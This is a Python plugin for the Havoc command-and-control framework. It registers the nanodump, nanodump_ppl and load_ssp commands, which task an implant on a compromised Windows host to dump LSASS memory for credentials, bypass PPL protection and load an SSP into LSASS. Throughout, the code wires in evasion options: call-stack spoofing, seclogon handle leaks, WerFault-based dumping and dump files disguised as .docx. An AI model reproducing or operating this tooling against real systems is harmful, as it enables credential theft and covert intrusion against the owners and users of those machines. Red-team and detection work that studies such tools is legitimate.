from havoc import Demon, RegisterCommand
from struct import pack, calcsize
import re

def is_full_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

class NNDPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def nanodump(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = NNDPacker()

    num_params = len(params)
    get_pid = False
    use_valid_sig = False
    write_file = False
    dump_path = ''
    pid = 0
    fork = False
    snapshot = False
    dup = False
    elevate_handle = False
    duplicate_elevate = False
    use_seclogon_leak_local = False
    use_seclogon_leak_remote = False
    seclogon_leak_remote_binary = ''
    use_silent_process_exit = False
    silent_process_exit = ''
    use_lsass_shtinkering = False
    use_seclogon_duplicate = False
    spoof_callstack = 0

    demon = Demon( demonID )

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--getpid':
            # get the PID of LSASS and leave
            get_pid = True
        elif param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return True
            dump_path = params[i + 1]
        elif param == '--pid' or param == '-p':
            # set the PID of LSASS
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --pid value" )
                return True
            try:
                pid = int(params[i + 1])
            except Exception as e:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid PID: {params[i]}" )
                return True
        elif param == '--fork' or param == '-f':
            # set arg to true for process forking
            fork = True
        elif param == '--snapshot' or param == '-s':
            # set arg to true for process snapshot
            snapshot = True
        elif param == '--duplicate' or param == '-d':
            # set arg to true for handle duplication
            dup = True
        elif param == "--elevate-handle" or param == "-eh":
            # set arg to true for elevate handle
            elevate_handle = True
        elif param == "--duplicate-elevate" or param == "-de":
            # set arg to true for duplicate_elevate handle
            duplicate_elevate = True
        elif param == "--seclogon-leak-local" or param == "-sll":
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "sorry, --seclogon-leak-local is not supported right now" )
            return True
            # use MalSecLogon leak local
            use_seclogon_leak_local = True
        elif param == "--seclogon-leak-remote" or param == "-slr":
            # use MalSecLogon leak remote
            use_seclogon_leak_remote = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --seclogon-leak-remote value" )
                return True
            # decoy binary path
            seclogon_leak_remote_binary = params[i + 1]
            if is_full_path(seclogon_leak_remote_binary) is False:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You must provide a full path: {seclogon_leak_remote_binary}" )
                return True
        elif param == "--silent-process-exit" or param == "-spe":
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --silent-process-exit value" )
                return True
            use_silent_process_exit = True
            silent_process_exit = params[i + 1]
        elif param == "--shtinkering" or param == "-sk":
            # TODO: check if the user is system
            #user = beacon_info($1, "user" );
            #if user != "SYSTEM *":
            #    demon.ConsoleWrite( demon.CONSOLE_ERROR, "You must be SYSTEM to run the Shtinkering technique" )
            #    return True
            use_lsass_shtinkering = True
        elif param == "--seclogon-duplicate" or param == "-sd":
            # use the seclogon race condition to dup an LSASS handle
            use_seclogon_duplicate = True
        elif param == "--spoof-callstack" or param == "-sc":
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --spoof-callstack value" )
                return True
            if params[i + 1] == "svchost":
                spoof_callstack = 1
            elif params[i + 1] == "wmi":
                spoof_callstack = 2
            elif params[i + 1] == "rpc":
                spoof_callstack = 3
            else:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "invalid --spoof-callstack value" )
                return True
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Obtain an LSASS handle via:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate, -d" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate a high privileged existing LSASS handle" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate-elevate, -de" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate a low privileged existing LSASS handle and then elevate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-leak-local, -sll" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            leak an LSASS handle into nanodump via seclogon" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            leak an LSASS handle into another process via seclogon and duplicate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-duplicate, -sd" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            make seclogon open a handle to LSASS and duplicate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS using a fake calling stack" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Let WerFault.exe (instead of nanodump) create the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            force WerFault.exe to dump LSASS via SilentProcessExit" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --shtinkering, -sk" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            force WerFault.exe to dump LSASS via Shtinkering" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid reading LSASS directly:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --fork, -f" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            fork the target process before dumping" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --snapshot, -s" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            snapshot the target process before dumping" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid opening a handle with high privileges:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --elevate-handle, -eh" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS with low privileges and duplicate it to gain higher privileges" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Miscellaneous:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --getpid" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print the PID of LSASS and leave" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return True
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return True

    if get_pid is False and write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write or --getpid" )
        return True

    if get_pid and \
        (write_file or use_valid_sig or snapshot or fork or elevate_handle or duplicate_elevate or
         use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
         use_seclogon_leak_remote or dup or use_silent_process_exit or use_lsass_shtinkering):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --getpid is used alone" )
        return True

    if use_silent_process_exit and \
        (write_file or use_valid_sig or snapshot or fork or elevate_handle or duplicate_elevate or
         use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
         use_seclogon_leak_remote or dup or use_lsass_shtinkering):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --silent-process-exit is used alone" )
        return True

    if fork and snapshot:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --fork and --snapshot cannot be used together" )
        return True

    if dup and elevate_handle:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --elevate-handle cannot be used together" )
        return True

    if duplicate_elevate and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --spoof-callstack cannot be used together" )
        return True

    if dup and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --spoof-callstack cannot be used together" )
        return True

    if dup and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-duplicate cannot be used together" )
        return True

    if elevate_handle and duplicate_elevate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --duplicate-elevate cannot be used together" )
        return True

    if duplicate_elevate and dup:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --duplicate cannot be used together" )
        return True

    if duplicate_elevate and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-duplicate cannot be used together" )
        return True

    if elevate_handle and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-duplicate cannot be used together" )
        return True

    if dup and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-local cannot be used together" )
        return True

    if duplicate_elevate and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-local cannot be used together" )
        return True

    if elevate_handle and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-local cannot be used together" )
        return True

    if dup and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-remote cannot be used together" )
        return True

    if duplicate_elevate and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-remote cannot be used together" )
        return True

    if elevate_handle and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-remote cannot be used together" )
        return True

    if use_seclogon_leak_local and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together" )
        return True

    if use_seclogon_leak_local and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-duplicate cannot be used together" )
        return True

    if use_seclogon_leak_local and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --spoof-callstack cannot be used together" )
        return True

    if use_seclogon_leak_remote and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together" )
        return True

    if use_seclogon_leak_remote and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --spoof-callstack cannot be used together" )
        return True

    if use_seclogon_duplicate and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-duplicate and --spoof-callstack cannot be used together" )
        return True

    if use_lsass_shtinkering is False and use_seclogon_leak_local and write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "If --seclogon-leak-local is being used, you need to provide the dump path with --write" )
        return True

    if use_lsass_shtinkering is False and use_seclogon_leak_local and is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"If --seclogon-leak-local is being used, you need to provide the full path: {dump_path}" )
        return True

    if use_lsass_shtinkering and fork:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --fork cannot be used together" )
        return True

    if use_lsass_shtinkering and snapshot:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --snapshot cannot be used together" )
        return True

    if use_lsass_shtinkering and use_valid_sig:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --valid cannot be used together" )
        return True

    if use_lsass_shtinkering and write_file:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --write cannot be used together" )
        return True

    """
    if use_seclogon_leak_local:
        folder = "C:\\Windows\\Temp";
        seclogon_leak_remote_binary = folder . "\\" .  generate_rand_string(5, 10) . ".exe";
        # read in the EXE file
        handle = openf(script_resource("bin/nanodump." . barch . ".exe" ))
        exe = readb(handle, -1)
        closef(handle)
        if len(exe) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read exe file" )
            return

        # upload the nanodump binary
        bupload_raw(1, seclogon_leak_remote_binary, exe)
    """

    packer.adduint32(pid)
    packer.addstr(dump_path)
    packer.addbool(write_file)
    packer.addbool(use_valid_sig)
    packer.addbool(fork)
    packer.addbool(snapshot)
    packer.addbool(dup)
    packer.addbool(elevate_handle)
    packer.addbool(duplicate_elevate)
    packer.addbool(get_pid)
    packer.addbool(use_seclogon_leak_local)
    packer.addbool(use_seclogon_leak_remote)
    packer.addstr(seclogon_leak_remote_binary)
    packer.addbool(use_seclogon_duplicate)
    packer.adduint32(spoof_callstack)
    packer.addbool(use_silent_process_exit)
    packer.addstr(silent_process_exit)
    packer.addbool(use_lsass_shtinkering)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump BOF" )

    demon.InlineExecute( TaskID, "go", "bin/nanodump.x64.o", packer.getbuffer(), False )

    return TaskID

def nanodump_ppl(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = NNDPacker()

    num_params = len(params)
    use_valid_sig = False
    write_file = False
    dump_path = ''
    dup = False

    demon = Demon( demonID )

    with open('bin/nanodump_ppl.x64.dll', 'rb') as f:
        dll = f.read()
    if len(dll) == 0:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
        return True

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return True
            dump_path = params[i + 1]
        elif param == '--duplicate' or param == '-d':
            # set arg to true for handle duplication
            dup = True
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Obtain an LSASS handle via:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate, -d" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate an existing LSASS handle" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return True
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return True

    if write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
        return True

    if is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
        return True

    packer.addstr(dump_path)
    packer.addbool(use_valid_sig)
    packer.addbool(dup)
    packer.addbytes(dll)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl BOF" )

    demon.InlineExecute( TaskID, "go", "bin/nanodump_ppl.x64.o", packer.getbuffer(), False )

    return TaskID

def load_ssp(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = NNDPacker()

    num_params = len(params)
    ssp_path = ''

    demon = Demon( demonID )

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing the SSP path" )
        return True

    ssp_path = params[ 0 ] 

    packer.addstr(ssp_path)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute load_ssp BOF" )

    demon.InlineExecute( TaskID, "go", "bin/load_ssp.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( nanodump, "", "nanodump", "Dump the LSASS process", 0, "nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", "nanodump -w c:\\windows\\Temp\\test.txt" )
RegisterCommand( nanodump_ppl, "", "nanodump_ppl", "Bypass PPL and dump LSASS", 0, "nanodump_ppl --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", "nanodump_ppl -w c:\\windows\\Temp\\test.txt" )
RegisterCommand( load_ssp, "", "load_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "load_ssp <SSP path>", "load_ssp C:\\Windows\\Temp\\nanodump_ssp.x64.dll" )
